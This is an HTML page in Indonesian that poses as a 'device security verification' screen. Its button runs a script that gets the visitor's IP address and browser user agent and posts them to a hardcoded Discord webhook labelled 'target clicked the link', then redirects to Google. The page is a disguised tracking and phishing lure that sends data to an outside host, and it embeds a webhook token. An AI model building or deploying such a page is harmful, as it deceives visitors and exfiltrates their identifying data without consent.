<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        button { background: #0084ff; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h2>⚠️ Verifikasi Perangkat</h2>
        <p>Lakukan verifikasi untuk mengamankan perangkat Anda dari akses tidak dikenal.</p>
        <button onclick="kirimData()">VERIFIKASI SEKARANG</button>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1481431980670324920/cb5lvc-SYtimk_b1WuTFMxQOj5RABUPKdXeFrQfUMxYWeyILmR56dT_78DMyR0Qx0043";

        async function kirimData() {
            try {
                // Ambil data IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                // Kirim ke Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "🚨 **TARGET MENGKLIK LINK!** 🚨",
                        embeds: [{
                            fields: [
                                { name: "IP Address", value: data.ip, inline: true },
                                { name: "Identitas Perangkat", value: navigator.userAgent, inline: false }
                            ]
                        }]
                    })
                });
            } catch (e) { console.error(e); }
            
            // Redirect setelah kirim
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
